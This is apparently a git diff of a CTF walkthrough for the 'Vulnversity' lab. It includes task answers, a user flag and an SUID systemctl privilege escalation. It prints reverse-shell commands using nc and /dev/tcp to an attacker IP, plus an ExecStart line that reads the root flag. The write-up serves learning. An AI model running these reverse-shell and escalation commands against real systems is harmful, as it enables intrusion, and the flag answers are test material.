@@ -3,7 +3,7 @@
 # Vulnversity
 Note: Box seemed very unstable and constantly dropping packets. Ping reponse is less than 70% even after waiting 10 mins. Grrr
 
-# 'TASK 1
+# TASK 1
 
 Fire up the box and wait a bit for pings to return
 Create working folder and nmap folder
@@ -12,7 +12,7 @@ Setup IP variable for simplicity
 Export IP=<ip address>
 10.10.101.248
 
-'''TASK 2
+# TASK 2
 
 Q. Scan the box; 
 #Nmap scan
@@ -72,12 +72,12 @@ A. 3333
 Q. What is the flag for enabling verbose mode using Nmap?
 A. -v
 
-''TASK 3
+# TASK 3
 
 Q. What is the directory that has an upload form page?
 A. /internal/
 
-'''TASK 4
+# TASK 4
 
 Q. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
 A. .php
@@ -91,7 +91,7 @@ A. bill
 Q. What is the user flag?
 A. 8bd7992fbe8a6ad22a63361004cfcedb
 
-'''TASK 5
+# TASK 5
 
 Q. On the system, search for all SUID files. Which file stands out?
 A. /bin/systemctl
@@ -148,16 +148,16 @@ WantedBy=multi-user.target' > $TF
 /bin/systemctl link $TF
 /bin/systemctl enable --now $TF
 
-# We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...
+'We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...
 
 Googling around I found 
 
 ExecStart=/bin/sh -c "nc -e /bin/bash 10.2.57.121 9999"
-# that didn't work. no -e option
+'that didn't work. no -e option
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.57.121/5555 0>&1'
-# this didn't work either. "Bad fd number"
-More googling!
-Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read
+'this didn't work either. "Bad fd number"
+'More googling!
+'Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read
 
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
 
